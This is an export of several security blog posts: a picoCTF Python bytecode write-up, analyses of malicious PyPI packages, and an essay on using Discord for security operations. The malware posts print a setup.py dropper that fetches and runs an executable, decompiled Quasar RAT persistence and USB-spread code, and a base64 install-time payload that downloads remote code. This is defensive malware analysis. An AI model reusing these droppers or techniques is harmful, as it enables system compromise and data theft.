\u0026#34;o\u0026#34; # _Jo key_str = key_str + \u0026#34;3\u0026#34; # _Jo3 key_str = \u0026#34;t\u0026#34; + key_str # Again, order of operations. t_Jo3 In Python disassembled output, we\u0026rsquo;ll see that list comprehensions are referenced as code objects. These might seem like blackbox functions, but they\u0026rsquo;re actually just appended to the end of the document. So we have a list comprehension reference:\n9 120 LOAD_CONST 36 (\u0026lt;code object \u0026lt;listcomp\u0026gt; at 0x7f5ef6665d40, file \u0026#34;snake.py\u0026#34;, line 9\u0026gt;) 122 LOAD_CONST 37 (\u0026#39;\u0026lt;listcomp\u0026gt;\u0026#39;) 124 MAKE_FUNCTION 0 126 LOAD_NAME 1 (key_str) 128 GET_ITER 130 CALL_FUNCTION 1 132 STORE_NAME 2 (key_list) And I chose to replace LOAD_CONST \u0026lt;listcomp\u0026gt; with our actual list comprehension object.\nDisassembly of \u0026lt;code object \u0026lt;listcomp\u0026gt; at 0x7f5ef6665d40, file \u0026#34;snake.py\u0026#34;, line 9\u0026gt;: 9 0 BUILD_LIST 0 2 LOAD_FAST 0 (.0) \u0026gt;\u0026gt; 4 FOR_ITER 12 (to 18) 6 STORE_FAST 1 (char) 8 LOAD_GLOBAL 0 (ord) 10 LOAD_FAST 1 (char) 12 CALL_FUNCTION 1 14 LIST_APPEND 2 16 JUMP_ABSOLUTE 4 \u0026gt;\u0026gt; 18 RETURN_VALUE So the real question here is what are we actually doing. In Python, list comprehensions tend to look a bit like\u0026hellip;\nitem for item in iterable And we can see that we have a string, we\u0026rsquo;re loading the global ord, which will convert our characters to their ordinal representation (simply the decimal value). So let\u0026rsquo;s try to write out what that might look like\u0026hellip;\nkey_list = [ord(char) for char in key_str] At any point in this we can actually just check our assumptions by disassembling our expected content.\nimport dis code = \u0026#34;\u0026#34;\u0026#34;key_list = [ord(char) for char in key_str]\u0026#34;\u0026#34;\u0026#34; dis.dis(code) To avoid taking up more horizontal content, this does indeed directly match our intended solution, with some slight variations depending on the version of the Python interpreter you\u0026rsquo;re using. But that\u0026rsquo;s where we can cross-check our assumptions as we carry forward and piece together more of the code.\nFor those that are familiar with CTF style challenges, this should start to look familiar. It appears we\u0026rsquo;re building out an XOR key for our initial list.\nAt this point ,the challenge is actually solvable, XOR\u0026rsquo;ing those items with the repeating key will result in the intended solution. But we\u0026rsquo;ll continue to reverse this for posterity. We have a very long code block next that reverses to a very concise piece of code. Again, having some intuition for what our end-goal is makes this trivial.\n5 26 LOAD_NAME 3 (len) 28 LOAD_NAME 2 (key_list) 30 CALL_FUNCTION 1 32 LOAD_NAME 3 (len) 34 LOAD_NAME 0 (input_list) 36 CALL_FUNCTION 1 38 COMPARE_OP 0 (\u0026lt;) 40 POP_JUMP_IF_FALSE 34 (to 68) 6 \u0026gt;\u0026gt; 42 LOAD_NAME 2 (key_list) 44 LOAD_METHOD 4 (extend) 46 LOAD_NAME 2 (key_list) 48 CALL_METHOD 1 50 POP_TOP 5 52 LOAD_NAME 3 (len) 54 LOAD_NAME 2 (key_list) 56 CALL_FUNCTION 1 58 LOAD_NAME 3 (len) 60 LOAD_NAME 0 (input_list) 62 CALL_FUNCTION 1 64 COMPARE_OP 0 (\u0026lt;) 66 POP_JUMP_IF_TRUE 21 (to 42) Here we take the length of key_list and the length of input_list and perform a comparison. If key_list is less than (\u0026lt;) we\u0026rsquo;re going to extend key_list by key_list, and repeat until that condition is no longer true. In Python, that looks a bit like this\u0026hellip;\nwhile len(key_list) \u0026lt; len(input_list): key_list.extend(key_list) The states of our list look something like the below, but keep in mind that we\u0026rsquo;re dealing with ordinals. (So instead of t_Jo3 we\u0026rsquo;re actually dealing with 116, 945, 74, 111, 51).\nt_Jo3 t_Jo3t_Jo3 t_Jo3t_Jo3t_Jo3t_Jo3 t_Jo3t_Jo3t_Jo3t_Jo3t_Jo3t_Jo3t_Jo3t_Jo3 All we\u0026rsquo;re doing here is padding out key_list to be equal in length to input_list for the XOR operation. At the end of this operation, both are now at a length of 40. This also results in the comparison operation we mentioned earlier no longer being true, so we exit the while loop, and continue.\n15 \u0026gt;\u0026gt; 162 LOAD_CONST 38 (\u0026lt;code object \u0026lt;listcomp\u0026gt; at 0x7f5ef6665df0, file \u0026#34;snake.py\u0026#34;, line 15\u0026gt;) 164 LOAD_CONST 37 (\u0026#39;\u0026lt;listcomp\u0026gt;\u0026#39;) 166 MAKE_FUNCTION 0 168 LOAD_NAME 5 (zip) 170 LOAD_NAME 0 (input_list) 172 LOAD_NAME 2 (key_list) 174 CALL_FUNCTION 2 176 GET_ITER 178 CALL_FUNCTION 1 180 STORE_NAME 6 (result) Uh oh, another list comprehension. Let\u0026rsquo;s take a peek into that.\nDisassembly of \u0026lt;code object \u0026lt;listcomp\u0026gt; at 0x7f5ef6665df0, file \u0026#34;snake.py\u0026#34;, line 15\u0026gt;: 15 0 BUILD_LIST 0 2 LOAD_FAST 0 (.0) \u0026gt;\u0026gt; 4 FOR_ITER 16 (to 22) 6 UNPACK_SEQUENCE 2 8 STORE_FAST 1 (a) 10 STORE_FAST 2 (b) 12 LOAD_FAST 1 (a) 14 LOAD_FAST 2 (b) 16 BINARY_XOR 18 LIST_APPEND 2 20 JUMP_ABSOLUTE 4 \u0026gt;\u0026gt; 22 RETURN_VALUE This is actually super simple here. We can see that the iterable in this scenario is going to be the result of zipping input_list and key_list together. This operation will create a tuple in the form of (input_list[n], key_list[n]) or, essentially just pairs for each item for each index.\nIn the actual list comprehension, we can see that we\u0026rsquo;re going to unpack this sequence into values a and b, and then we\u0026rsquo;re going to perform a binary XOR on these values. Lastly, we\u0026rsquo;ll append these to a list, and then repeat for the rest of the zipped iterables.\nIn Python, this looks something like this.\nresult = [a^b for a,b in zip(input_list, key_list)] At this point, we\u0026rsquo;ve got the ordinal values for the flag in the proper sequence. So now we can look at the final bit of disassembled Python code.\n8 88 LOAD_CONST 5 (\u0026#39;\u0026#39;) 90 LOAD_METHOD 7 (join) 92 LOAD_NAME 8 (map) 94 LOAD_NAME 9 (chr) 96 LOAD_NAME 6 (result) 98 CALL_FUNCTION 2 100 CALL_METHOD 1 102 STORE_NAME 10 (result_text) 9 104 LOAD_NAME 11 (print) 106 LOAD_NAME 10 (result_text) 108 CALL_FUNCTION 1 110 POP_TOP 112 LOAD_CONST 6 (None) 114 RETURN_VALUE This actually just ends up looking shockingly like what we\u0026rsquo;d write in Python. ''.join(...) will join the items of the iterable with the string that it\u0026rsquo;s called on. So since we call it on an empty string, we\u0026rsquo;re essentially just joining the characters.\nThis presents a problem however, the actual values are still integers, so we\u0026rsquo;ll end up with a strange output. Fear not, that\u0026rsquo;s what the map and char names are for.\nWe\u0026rsquo;re going to map the chr function across the result list, and then join each of those items with no string separator. In other words\u0026hellip;\nresult_text = \u0026#39;\u0026#39;.join(map(chr,result)) And now we have the fully reversed program. We need to print out this value, so our final Python output is the following:\ninput_list = [4, 54, 41, 0, 112, 32, 25, 49, 33, 3, 0, 0, 57, 32, 108, 23, 48, 4, 9, 70, 7, 110, 36, 8, 108, 7, 49, 10, 4, 86, 43, 108, 112, 14, 2, 71, 62, 115, 88, 78] key_str = \u0026#34;J\u0026#34; key_str = \u0026#34;_\u0026#34; + key_str key_str = key_str + \u0026#34;o\u0026#34; key_str = key_str + \u0026#34;3\u0026#34; key_str = \u0026#34;t\u0026#34; + key_str key_list = [ord(char) for char in key_str] while len(key_list) \u0026lt; len(input_list): key_list.extend(key_list) print(key_list) result = [a^b for a,b in zip(input_list, key_list)] result_text = \u0026#39;\u0026#39;.join(map(chr,result)) print(result_text) And if we run this we will receive our flag: picoCTF{N0t_sO_coNfus1ng_sn@ke_3:a13a97}\nSummary # What a cool exercise. While not shockingly difficult, I can see this being a bit of a stumbling block for anyone not familiar with Python, specifically with how list comprehensions are structured. I\u0026rsquo;ve spent a lot of time doing this, and I definitely got caught up on the key_str string building portion by not checking the order of operations.\nDisassembled Python bytecode is super cool, but I saw a lot of people asking how they need to disassemble the document passed in the challenge, so I wanted to take a moment to discuss that as well.\nThe challenge distributes the already disassembled bytecode. If we weren\u0026rsquo;t given this, we might want to use something like zrax\u0026rsquo;s pycdc to take our Python bytecode from *.pyc back to either a representation of the original content (with pycdc) or the disassembled output (with pycdas). This has a ton of relevant applications, and we do this fairly frequently at Vipyr Security while inspecting packages for malware, especially when heavily obfuscated.\nWith all of the above in mind, no special tools are needed for this solution, and once some intuition is derived from the underlying code, we can actually simply perform the XOR ourselves without reconstructing the full code output. But it made for a fun exercise.\n","date":"26 March 2024","externalUrl":null,"permalink":"/posts/pico24-weirdsnake/","section":"Posts","summary":"Reverse engineering disassembled Python bytecode back to the original code.","title":"Pico CTF 24 - weirdSnake","type":"posts"},{"content":"","date":"26 March 2024","externalUrl":null,"permalink":"/tags/reverse-engineering/","section":"Tags","summary":"","title":"Reverse Engineering","type":"tags"},{"content":"Recently we were flagged for the detection of a threat actor we\u0026rsquo;ve seen a few times in the past, DreamyOak. This individual has maintained a fairly consistent presence on the Python Package Index, often using the pseudonym \u0026lsquo;Nagogy\u0026rsquo; to distribute their malware. In the most recent flags, nagiepy v3.422.0 and nageir v0.1.2 pinged off of our detection schemas, and were promptly reported and removed. Let\u0026rsquo;s take a deep look into what these files actually are. I\u0026rsquo;m going to walk through this in the sequence of events that I took during the actual analysis of this script.\nInitial Analysis # import requests import os import subprocess url = \u0026#39;****************/cdn/MEYeniKS.exe\u0026#39; response = requests.get(url) with open(\u0026#39;windows.exe\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(response.content) subprocess.run(\u0026#39;windows.exe\u0026#39;, check=True) Pretty simple dropper script, runs during setup.py, drops a file, then runs it. For the uninitiated, setup.py is a script used to\u0026hellip; well, setup Python packages. PIP interfaces with setup.py to determine requirements and information, and as such, allows the arbitrary execution of code contained within setup.py. Which means, subsequently, that simply pip install \u0026lt;package\u0026gt; would download and run this payload.\nBut we can do better than just determining this is a dropper, let\u0026rsquo;s dig a little deeper. I went ahead and curled down the executable from the URL and ran it through Detect It Easy.\nremnux@remnux:~/Malware/nageir$ diec MEYeniKS.exe PE32 Library: .NET(v4.0.30319)[-] Compiler: VB.NET(-)[-] Linker: Microsoft Linker(8.0)[GUI32] Dotnet\u0026rsquo;s are always fun. As an aside, I got to about this point, and spent 30 minutes trying to figure out where the Dotnet SDK was on REMnux, before acquiescing and consulting the documentation, which\u0026hellip; let me know that ILSpy, the program I was going to use to disassemble this, was already installed in command line form via ilspycmd. Enjoy some schadenfreude.\nAnywhoozit, whack it with the ILSpy bat: ilspycmd MEYeniKS.exe. And out pops\u0026hellip; well, exactly what we\u0026rsquo;re looking for. I appreciate it when it\u0026rsquo;s easy.\nDiving into .NET # The first indicator of what exactly I might be looking at came in the form of QuasarClient:\ninternal static class Program { public static QuasarClient ConnectClient; private static ApplicationContext _msgLoop; Quasar is a recognized RAT. Got it by the first line, we\u0026rsquo;re done here, pack it up and send \u0026rsquo;em home\u0026hellip;\nOr not. There\u0026rsquo;s about 20,000 lines of code here. Certainly there\u0026rsquo;s something else going on. Let\u0026rsquo;s dig a little deeper into what in the world DreamyOak has for us.\nif (Settings.ANTIDEBUG){ if (Debugger.IsAttached){ Process.GetCurrentProcess().Kill(); } if (IsDebuggerPresent()){ Process.GetCurrentProcess().Kill(); } } if (Settings.ENABLEANTIVM \u0026amp;\u0026amp; IsAntiVM()){ Process.GetCurrentProcess().Kill(); } if (Settings.ENABLEANTISANDBOXIE \u0026amp;\u0026amp; DetectSandboxie()){ Process.GetCurrentProcess().Kill(); } Well, it\u0026rsquo;s an attempt at AntiVM and AntiDebugger. As an aside, it\u0026rsquo;s very entertaining to me just how often we see this in scripts that statically decompile/disassemble. Your program cannot possibly check if there\u0026rsquo;s a debugger if\u0026hellip; I\u0026rsquo;m not using one. Anyway, moving right along. Side note, I tried to make this a little more human readable. I can assure you that\u0026hellip; significant author liberties have been taken in reformatting this code to be less offensive.\nif (Settings.STARTUPPERSISTENCE){ Thread thread2 = new Thread((ThreadStart)delegate{ while (true){ try{ if (!keyExists(Settings.STARTUPKEY)){ RegistryKeyHelper.AddRegistryKeyValue((RegistryHive)(-2147483647), \u0026#34;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\u0026#34;, Settings.STARTUPKEY, ClientData.CurrentPath, addQuotes: true); } } catch{ } Thread.Sleep(5000); } }); thread2.IsBackground = true; thread2.Start(); Well neato, we\u0026rsquo;ve got some registry persistence and with a nice long sleep to make sure we\u0026rsquo;re continually adding it in the event that the registry is restored but the malware itself is not removed. That\u0026rsquo;ll be a little spookier later on.\nif (Settings.ENABLEUSBSPREAD){ Thread thread3 = new Thread((ThreadStart)delegate{ SpreadUSB(); }); thread3.IsBackground = true; thread3.Start(); } if (Settings.ENABLEBTCSWAP){ Thread thread4 = new Thread((ThreadStart)delegate{ BTCSWAPPERRUN(); }); thread4.IsBackground = true; thread4.Start(); USB Spread? Well that\u0026rsquo;s interesting, we\u0026rsquo;ll discuss that later. Elsewhere, we see BTCSWAP is going to be a generic cryptoclipper. I\u0026rsquo;m not going to spend a whole lot of time talking about that, but it essentially simply finds valid BTC addresses in your clipboard and replaces them with the malware author\u0026rsquo;s BTC address instead, thus resulting in you sending them money.\nLet\u0026rsquo;s talk about USB Spread though.\nprivate static void SpreadUSB(){ //IL_001a: Unknown result type (might be due to invalid IL or missing references) //IL_0020: Invalid comparison between Unknown and I4 DriveInfo[] drives = DriveInfo.GetDrives(); foreach (DriveInfo val in drives){ if (!val.get_IsReady() \u0026amp;\u0026amp; (int)val.get_DriveType() != 2){ continue; } try{ string text = val.get_Name() + \u0026#34;autorun.inf\u0026#34;; string text2 = val.get_Name() + Settings.USBSpreadNAME + \u0026#34;.exe\u0026#34;; if (File.Exists(text)){ File.Delete(text); } if (File.Exists(text2)){ File.Delete(text2); } using StreamWriter streamWriter = new StreamWriter(new FileStream(text, FileMode.Create, FileAccess.Write)); streamWriter.WriteLine(\u0026#34;[AutoRun]\u0026#34;); streamWriter.WriteLine(\u0026#34;action=\u0026#34; + Settings.USBSpreadNAME + \u0026#34;.exe\u0026#34;); } catch{ } } } So I consulted with some random people on the internet and Google experts and they revealed to me that this shouldn\u0026rsquo;t actually work. But on the premise that I think it\u0026rsquo;s cute, this attempts to write itself to connected USB devices and instantiate the script via an autorun.inf by replacing the current autorun scripts. Does it work? Eh\u0026ndash; I don\u0026rsquo;t think out of the box. But if the device is already trusted, this may be used to swap the payload on the device and thus work as expected. Like I said, cute.\nOther than that, there isn\u0026rsquo;t anything shocking in here, I thought this got some fail points though.\nAES.SetDefaultKey(ENCRYPTIONKEY); TAG = AES.Decrypt(TAG); VERSION = AES.Decrypt(VERSION); HOSTS = AES.Decrypt(HOSTS); SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY); INSTALLNAME = AES.Decrypt(INSTALLNAME); MUTEX = AES.Decrypt(MUTEX); STARTUPKEY = AES.Decrypt(STARTUPKEY); LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME); USBSpreadNAME = AES.Decrypt(USBSpreadNAME); BTCAddress = AES.Decrypt(BTCAddress); Encrypted host information is typically problematic for us\u0026ndash; it would be nice to be able to get the values of the\u0026ndash; oh. Wait.\npublic static string ENCRYPTIONKEY = \u0026#34;CN2muEFrSR3WC5IfEA2p\u0026#34;; Never mind, we\u0026rsquo;re good. A quick scroll through the program reveals more or less a lot of the function definitions and not much of interest that wouldn\u0026rsquo;t just be me talking about coding in general, so I\u0026rsquo;ll keep it brief and cut it off here.\nAfterthoughts # It\u0026rsquo;s about now as I\u0026rsquo;m writing this that another team member has managed to track down some additional information about what, exactly I\u0026rsquo;m decompiling. And as anticipated (or rather, shown to me) in line 1, this is indeed a simple Quasar RAT. Fun exercise though!\nLessons Learned:\nGoogle the payload name you found on line 1 so you don\u0026rsquo;t waste your time. Prebuilt RE distributions are cool but locating tools requires an iota of brainpower. If a function exists overtly named \u0026ldquo;BTCSWAPPERRUN\u0026rdquo;, the functions probably tell you what everything does. Hard-coded AES keys are really cool and everyone should use them in their malware. ","date":"22 July 2023","externalUrl":null,"permalink":"/posts/dreamyoak-malware/","section":"Posts","summary":"Following the kill chain of a malicious Python package, and decompiling a basic Quasar RAT while rapidly learning some valuable lessons.","title":"DreamyOak Quasar Malware","type":"posts"},{"content":"","date":"22 July 2023","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"","date":"22 July 2023","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"14 July 2023","externalUrl":null,"permalink":"/tags/pypi/","section":"Tags","summary":"","title":"Pypi","type":"tags"},{"content":"A persistent nuissance to the Python Packaging Index (PyPI) has been the \u0026ldquo;Kekw LTD\u0026rdquo; threat actor group. We\u0026rsquo;ve largely been tracking this group since the inception of our organization, and I\u0026rsquo;d like to take some time to share the details we\u0026rsquo;ve found. We initially were aware of these individuals from their consistent targeting of Discord members in programming communities, offering code assistance by way of dropping malicious payloads through PyPI packages. \u0026ldquo;You need to install this library,\u0026rdquo; they would acclaim. When moderators of these communities began to target this kind of behavior, this threat actor group largely shifted towards targeting individuals in Direct Messages, by way of browsing the user list for new users who would be vulnerable to this type of attack.\nThese payloads would drop two files, a dcbot.jar file which contained a token logger made by user Wiesel, and a Nuitka packed executable called neu2.exe which served to provide functions such as C2, token stealing, etc. This NEU2 payload, a spin-off of the common W4SP stealer, would exfiltrate user information such as web browser history, usernames and passwords, payment information, and other sensitive materials from the user\u0026rsquo;s computer to both a Discord webhook and an anonfiles | transfer.sh type service. We largely caught onto the presence of these webhooks within the payloads, and were able to automate the detection and removal pipeline for these webhooks by passing DELETE HTTP requests to them.\nEventually, as threat actors do, their TTP\u0026rsquo;s evolved. Instead of hosting obfuscated malware, they relied on productionized publishing. By automating the staging process, they were able to enumerate a weak point in the Python security architecture; the current reviews process.\nA Twofold Attack # Ultimately, this attack is carried out in two parts. GitHub accounts are used to stage payloads and act as a \u0026lsquo;burner\u0026rsquo; account to prevent the suspensions of the threat actors\u0026rsquo; real accounts. These GitHub accounts are used to increase the attack surface of the packages which otherwise would not receive as much attention.\nUtilizing automated removal detection, they enumerate pseudorandom package names such as \u0026ldquo;pythoncryptpkgsV2\u0026rdquo;, \u0026ldquo;pipsqlite3liberyV2\u0026rdquo;, etc., to install their own payloads through the GitHub accounts. These packages often contain the aforementioned information stealers. In the second \u0026lsquo;prong\u0026rsquo; of the attack, these individuals have productionized the uploading of malware to the Python Package Index. These two actions together make a difficult to remove nuissance-type attack.\nWe coordinated with Phylum upon initial realization of this, and worked to inform the supply chain security community with intelligence as it became available to ensure the lateral and layered effort to eradicate this sustained attack. Phylum published Respawning Malware Persists on PyPI on May 16th, 2023 detailing our discoveries and coordination between open source security enthusiasts to effectively detect and defeat this type of attack.\nShotgunning Information # On the dates of May 19th thru May 21st, Python Packaging administrators released a statement that account creation would be suspended pending a large influx of reports and lack of administrator availability. These were tied to a single Github user, PatrickPogoda. The productionized distribution of malware had reached a critical level whereby triple-digit package counts were being staged and detected, drawing to this singular user. As time carried on, the payload being staged morphed from a plaintext stealer to an obfuscated strain of malware utilizing Fernet encrypted data to attempt to evade detection (unsuccessfully, I might add.) While we were largely able to track and detect these individuals through payload modifications, ultimately attempting to stem the tide was difficult.\nThis threat actor group has largely been active since late 2022, dabbling in simple information stealers and distributing them through the Hypixel modding community. The shift to staging payloads on the Python Package Index, as well as the targeting of individual members in programming communities represents a substantial increase in threat, and largely has shifted the burden from simple malware to an extreme nuissance for cybersecurity analysts. Owing to a large level of threat intelligence and excellent specialists on the Vipyr Security team, as well as poor personal operational security on the part of the threat actor group, we\u0026rsquo;ve largely been able to document and follow these threat actors to the corners of the internet that they operate in.\nAs shown in the chart above, this threat actor group, which we\u0026rsquo;ve taken to calling by their original name \u0026ldquo;Kekw\u0026rdquo; has undergone several mutations of malware, all of which we currently successfully detect. We\u0026rsquo;ve also filed appropriate reports with domain registrars and GitHub to have these accounts suspended (successfully in most cases). While DCBOT and NEU2 present less of an issue holistically (and frankly, are well documented and detected at this point), the desire for these individuals to distribute their payload has dictated that they rely less on obfuscation and quiet signatures, and more on raw volume.\nSo What? # While this may seem like small fish in the grand scheme of things; a bunch of script kiddies generating nuissance malware that is often easily evaded by average users, the impact is still abundantly clear. User Battleb0t maintains a subdomain on his personal blog that contains numerous pictures of victims of the malware with both the names and organizations of Kekw and various threat actors within. Targeting and exploiting children for enjoyment represents a deplorable action that myself and Vipyr Security are dedicated to preventing.\nOn top of that, these packages often squat common library names in dependancy confusion type attacks, whereby a user intending to install a SQLite or Cryptographic package may inadvertently install these malicious packages instead. The effects are obvious\u0026ndash; from leaked password information to leaked business intelligence. While these may not be the target demographics, the threat against average users is still very much real.\nPrompting this blog post was the emergence of a new attack on the Python Package Index by the Kekw threat actor group utilizing the GitHub names mmatthew130 and wieselnuggis. Vipyr Security remains in coordination with appropriate adminstrators across the open source security spectrum to detect and prevent these types of attacks.\nAdditional Reading # Inside of the WASP\u0026rsquo;s Nest - VirusTotal, 19 June 2023\nRespawning Malware Persists on PyPI - Phylum, 16 May 2023\nPyPI Temporarily Pauses New Users\u0026hellip; - BleepingComputer, 20 May 2023\n","date":"14 July 2023","externalUrl":null,"permalink":"/posts/tracking-kekw/","section":"Posts","summary":"The Python Packaging Ecosystem remains fairly stable in the broad scope of open source package distribution, but they are not immune to sustained attacks either. One threat actor group has evolved from simple nuissance to a sustained stream of spam and malware utilizing GitHub staging and direct targeting of userbases for the distribution of malicious programs.","title":"Tracking Peristent PyPI Malware","type":"posts"},{"content":"I often find myself interacting with individuals on a formal basis and discussing how Vipyr Security does what it does. From the random interested Discord user to the Twitter DM, to professionals in legitimate organizations. It very much strikes me as slightly shameful to admit that we utilize Discord to conduct our operations. I\u0026rsquo;m not sure why; it offers plenty of useful tools for moderating communities, integrating tools and notifications, role based access, etc. But I\u0026rsquo;d be remiss to say that I don\u0026rsquo;t hang my head dejectedly a bit when I remark that we\u0026rsquo;ve built an entire Security Operations Center with Discord as the nucleus. So let\u0026rsquo;s talk about it\u0026hellip;\nRole Based Access # One of the major appeals to Discord is role based access. Internal cybersecurity discussions can be unfit for public consumption, yet not require a particularly strong level of legitimate security. While it\u0026rsquo;s not critical that things like our YARA ruleset or internal codebases remain internal, it\u0026rsquo;s certainly something that we benefit from heavily during the development process. I say that to more qualify the opinion that\u0026ndash; I understand Discord isn\u0026rsquo;t a secure communications platform, but the level of security that it does offer is likely more than enough for most open source communities and projects.\nRolling your own role based access or utilizing other platform is certainly an option, but with it comes a barrier to entry. Not everybody is willing to download Slack, and IRC has been on its last leg for the last two decades. (Will it ever die?) Discord itself has over 150 million monthly users according to Influencer Marketing Hub. Slack, by comparison, is predicted to have 32.3 million in 2023 by DemandSage. By sheer statistics alone, it\u0026rsquo;s more likely that an individual that you may wish to reach organizationally may have a Discord, so long as we ignore some potential factors such as age-groupings.\nCybersecurity (and at a more fundamental level, the computer science and information technology fields) tend to spend more time online in comparison to other fields. As a result, I think it stands to reason that a large portion of these individuals, as a result, will likely also maintain a Discord account of some sort, or at least be reasonably aware of it.\nWhat does this mean? Individuals tend towards knowing how to manipulate Discord as well.\nApplication Integration # Discord features a full suite of user interactivity tools and application development API\u0026rsquo;s. Most of these tools are utilized in the context of simple moderation bots. But what if we piped a constant feed of malware into a community full of malware analysts? Likewise, what if we templatized reporting through the Discord API to facilitate live interaction and ease of use of analyzing this malware?\nShockingly, it works pretty darn well. Being able to add functionality to a user-friendly front end that isn\u0026rsquo;t based on browsers or applications, but is delivered in a user-defined format to the very area where user interactions are occurring is remarkably useful. It encourages constant attention, and facilitates cooperation and ease of use.\nIt allows for expansion of features without redelivering software, and the best selling point\u0026ndash; it\u0026rsquo;s absolutely free. Being able to center your user base, your contributors and your interactions to a single, clearly defined point and integrating development processes into Discord itself through the API, through webhooks, through bots, through applications, etc., is highly effective at both creating and maintaining interest.\nBroaching the User Barrier # One thing I lament in the Python community is the level of seclusion that some core Python communities keep. Largely, the most intelligent discussions do not occur in a widely open forum. Instead, they often seclude themselves to the Python.org Discourse forums, or via Github interactions. While these may conventionally be open, it\u0026rsquo;s unlikely that individuals that are looking for information are going to enumerate these venues first. I would cite the 229 posts in the last month on the Python Discourse as evidence that it simply isn\u0026rsquo;t a primary resource.\nSo what should the primary user interaction venue be, exactly? Well, I would purport the following: This is transformational. If you hold some sort of knowledge to something, and desire that knowledge to be spread or interacted with, it\u0026rsquo;s largely your responsibility to place that information into public purview. To the credit of Core Python communities, and in general, communities as a whole\u0026ndash; the adoption of Discord as a community outreach and discussion platform for legitimate businesses is gaining momentum. Where internal discussions have previously been the standard, the level of interaction between enterprise and individual is steadily increasing.\nI believe we should celebrate live chat platforms and strive to reach individuals on the platforms they interact with. Whether that be Discord, or whatever comes next, it is fundamental both for organizations seeking open source contribution or discussion, or even just candid user feedback and interaction, to follow where their communities are most prevalent at the time. It\u0026rsquo;s not effective for you to generate an IRC channel on Freenode if nobody is going to interact with you in that channel, and it\u0026rsquo;s slightly disingenuous to imply that your organization is open to feedback when that feedback sits in a portion of the internet that sees little use.\nSo Why is it Shameful? # Harkening back to my initial point, I still feel a bit of dejectedness when I mention that we utilize Discord primarily to organize our community. And I\u0026rsquo;m truly not sure why; it ticks all the boxes. The integrations it offers are pivotal to how we\u0026rsquo;ve laid out our detections, the ability to modify how we interact with our API by convenience of bot commands and automated assistants has been great to engage our userbase and encourage community participation.\nPerhaps it\u0026rsquo;s the reputation that Discord holds, the idea that it\u0026rsquo;s a gathering place for gamers. Or the numerous communities, both public and private, that participate in matters such as leaking classified information or the proliferation of adult content and malicious software. But these don\u0026rsquo;t strike me as particularly unique to the Discord platform. I watched a Linus Tech Tips video recently on the idea that Discord itself could market towards enterprises as they lamented the change of user discriminators.\nI hope that one day soon, informing professionals and industry thought leaders that we\u0026rsquo;ve built a SOC-in-a-box that secures the Python ecosystem with Discord as it\u0026rsquo;s central interaction point isn\u0026rsquo;t something that I\u0026rsquo;m ashamed of\u0026ndash; at 500 packages detected and removed so far, it\u0026rsquo;s a proven recipe that is deadly effective. But for now, I\u0026rsquo;ll lament quietly that the social stigma of a community based on Discord could be perceived as unprofessional or illegitimate.\nClosing Remarks # I\u0026rsquo;m not really sure where I\u0026rsquo;m going with this\u0026ndash; it\u0026rsquo;s my blog post, I can do what I want I guess. But I do think it\u0026rsquo;s a fairly radical idea to center an enterprise where your community is rather than internally with outreach towards your community. If Discord is the \u0026ldquo;hot thing\u0026rdquo; now, then Discord is where you should be. If in the future Mastadon, or Threads, or Reddit takes off, then that is where you should be. Engaging the community is a fundamental aspect of both open source projects/communities and business enterprises, and I think we would stand to benefit greatly as an open-source ecosystem if we adopted these ideals.\n","date":"13 July 2023","externalUrl":null,"permalink":"/posts/discord-engagement/","section":"Posts","summary":"Discord is the most populated live chat interaction platform on the internet. Let\u0026rsquo;s take some time to discuss how we could use that to engage open source communities and enterprise user bases more effectively, and discuss some of the public perceptions that surround Discord.","title":"Discord Engagement","type":"posts"},{"content":"","date":"13 July 2023","externalUrl":null,"permalink":"/tags/social-media/","section":"Tags","summary":"","title":"Social Media","type":"tags"},{"content":"Before I begin, a gentle shoutout to Lockness Ko, our dynamic analysis specialist, for his assistance with the dynamic analysis portion of this particular malicious package.\nOn the 26th of June, a Python package named tabulation came across our malware feed. It displayed all the signs of being a malicious package\u0026ndash; executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, tabulate by utilizing it\u0026rsquo;s README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis.\nThe Payload # As mentioned, the payload contained a base64 encoded string that would execute upon the installation of the package. Nothing shockingly out of the ordinary or ground breaking here on the malware front, this is a common tactic, it\u0026rsquo;s easy to detect, and this particular version was easy enough to reverse as well.\nexec(base64.b64decode(\u0026#34;aW1wb3J0IHN1YnByb2Nlc3MsIG9zCmRlZiByKGMpOiA\\ KICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuUG9wZW4oYywgc2hlbGw9VHJ1ZSwgc3Rka\\ W49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI\\ 9c3VicHJvY2Vzcy5TVERPVVQsIGNsb3NlX2Zkcz1UcnVlKQogICAgb3V0cHV0ID0gc\\ mVzdWx0LnN0ZG91dC5yZWFkKCkKZGVmIHIyKGMpOgogICAgc3VicHJvY2Vzcy5Qb3B\\ lbihjLCBzaGVsbD1UcnVlLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZG91dD1zd\\ WJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgY2xvc2VfZmR\\ zPVRydWUpCmlmIG9zLm5hbWUgPT0gIm50IjoKICAgIGlmIG5vdCBvcy5wYXRoLmV4a\\ XN0cyhyIkM6L1Byb2dyYW1EYXRhL1VwZGF0ZXIiKToKICAgICAgICByKHIicG93ZXJ\\ zaGVsbCAtY29tbWFuZCAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29ud\\ GludWUnOyAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWU\\ nOyBJbnZva2UtV2ViUmVxdWVzdCAtVXNlQmFzaWNQYXJzaW5nIC1VcmkgaHR0cHM6L\\ y90cmFuc2Zlci5zaC9UVVVwUXJVdTlkL0luc3RhbGwuemlwIC1PdXRGaWxlICRlbnY\\ 6dG1wL2luc3QuemlwOyBFeHBhbmQtQXJjaGl2ZSAtRm9yY2UgLUxpdGVyYWxQYXRoI\\ 